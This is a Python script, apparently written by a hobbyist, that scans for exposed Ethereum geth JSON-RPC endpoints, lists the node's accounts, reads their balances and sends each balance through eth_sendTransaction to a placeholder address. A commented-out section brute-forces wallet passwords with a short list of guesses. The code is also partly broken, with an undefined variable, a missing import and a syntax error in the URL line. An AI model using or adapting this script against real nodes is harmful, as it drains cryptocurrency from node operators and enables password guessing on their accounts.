#this will be uploaded today last minute debugging and such
#this could have some fudge ups but I cant really try to much of the lifting of coins and im learning so testnets are options ill figure that out
#https://cryptovest.com/news/20-million--in-ethereum-stolen-due-to-geth-vulnerability/
#the above article inspired my research
import requests
import json
import math
import socket
from eth_utils import *
import threading, time



wallet_blacklist = ['']#put all fake wallets from response you notice here ;)


#brute_passes = ['Administrator','admin','P@$$w0rd123!','Passw0rd123']
wallets_with_balance = []
flagged_wallets_ips = []




def ether_get_rpc_methods(urlin):
    session = requests.Session()
    method = 'rpc_modules'
    params = []
    payload= {"jsonrpc":"2.0",
           "method":method,
           "params":params,
           "id":1}

    headers = {'Content-type': 'application/json'}

    response = session.post(urlin, json=payload, headers=headers,timeout =3)
    return response.text




def get_balance(wallet,urlin):
    session = requests.Session()
    method = 'eth_getBalance'
    params = [wallet,"latest"]
    payload= {"jsonrpc":"2.0",
           "method":method,
           "params":params,
           "id":1}

    headers = {'Content-type': 'application/json'}
    
    response = session.post(urlin, json=payload, headers=headers,timeout=3)
    resp_json = json.loads(response.text)
    for key, value in resp_json.items():
        if 'result' in key:
           try:
              inval = int(value, 16)
              i = from_wei(inval, 'ether')
              print(value,":"+str(i))
              if i > 0:
                 local_coin_object = {"Url":urlin,"Wallet-Balance":i,"Wallet-Address":wallet}
                 wallets_with_balance.append(local_coin_object)
                 return value
           except:
              pass


#standard unlocked hack
def shifty_hands(urlin,wallet,amounthex):
    wallets = []
    session = requests.Session()

    print("in shifty hands")
    method = 'eth_sendTransaction'
    params = [{"from": wallet, "to": "0xdeadb33f",'value': amounthex}]
    payload= {"jsonrpc":"2.0",
           "method":method,
           "params":params,
           "id":1}

    headers = {'Content-type': 'application/json'}

    response = session.post(urlin, json=payload, headers=headers,timeout=3)
    resp_json = json.loads(response.text)
    print(resp_json)
    return resp_json


#overloaded function sortof
def shifty_hands2(urlin,wallet,amounthex,password):
    wallets = []
    session = requests.Session()

    print("in shifty hands")
    method = 'eth_sendTransaction'
    params = [{"from": wallet, "to": "0xdeadb33f",'value': amounthex,'pass':str(password)}]
    payload= {"jsonrpc":"2.0",
           "method":method,
           "params":params,
           "id":1}

    headers = {'Content-type': 'application/json'}

    response = session.post(urlin, json=payload, headers=headers,timeout=3)
    resp_json = json.loads(response.text)
    return resp_json



def pick_pocket(urlin):
    wallets = []
    session = requests.Session()
    method = 'personal_listAccounts'
    params = []
    payload= {"jsonrpc":"2.0",
           "method":method,
           "params":params,
           "id":1}

    headers = {'Content-type': 'application/json'}

    response = session.post(urlin, json=payload, headers=headers,timeout=3)
    resp_json = json.loads(response.text)
    if resp_json['result']:
       for items in resp_json['result']:
           wallets.append(items)
    return wallets


def scanner(host,port,rpc_endpoint):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    result = sock.connect_ex((host,port))
    if result == 0:
       print("Port is open")
       try:
          print(rpc_endpoint)
          lean_with_it(rpc_endpoint)
          
       except:
           pass
    else:
      pass


       

def lean_with_it(rpc_api):
    #grab all wallets from rpc endpoint
    #get the balance of all wallets and store them in a list
    #than try to perform a transfer to I think replicate the in the wild attempts at least by the honeypot logs I have
    #if the password is needed account isn't unlocked but can we brute the password via transaction? i wonder
    wallets = pick_pocket(rpc_api)
    try:
       for  wallet in wallets:
            
            if wallet in wallet_blacklist:
               print("Flagged Wallet From Known HoneyPot")
               print("Flagged_Wallet Alert:"+rpc_api,wallet,ips)
               local_wallet = {"rpc-api":rpc_api,"Wallet":wallet,"Ip-Address-honeypot":ips}
               flagged_wallets_ips.append(local_wallet)
            
            balance_response = get_balance(wallet,rpc_api)
            print(balance_response)
            try:
               if balance_response:
                  try:
                     response = shifty_hands(rpc_api,wallet,balance_response)
                     print(response)
                     for key,value in response.items():
                         if "error" in key:
                             print(value)
                             '''
                             if "authentication needed: password or unlock" in value['message']:
                                 print("Password Protected Initiating Bruteforce Via 1Day Vector or 0day?")
                                 try:
                                     for brute_trys in brute_passes:
                                         brute_response = shifty_hands2(rpc_api,wallet,balance_response,brute_trys)
                                         print(brute_response)
                                 except:
                                     pass
                             ''' 
                         else:
                             print(value)
                  except:
                      pass
            except:
               pass
    except:
       pass






    


    host = sys.argv[1]
    port = sys.argv[2]
    url = "http://"+host+":"port
    try:
       lean_with_it(url)
       
    except:
        pass


for wallets_found in wallets_with_balance:
    print(wallets_found)

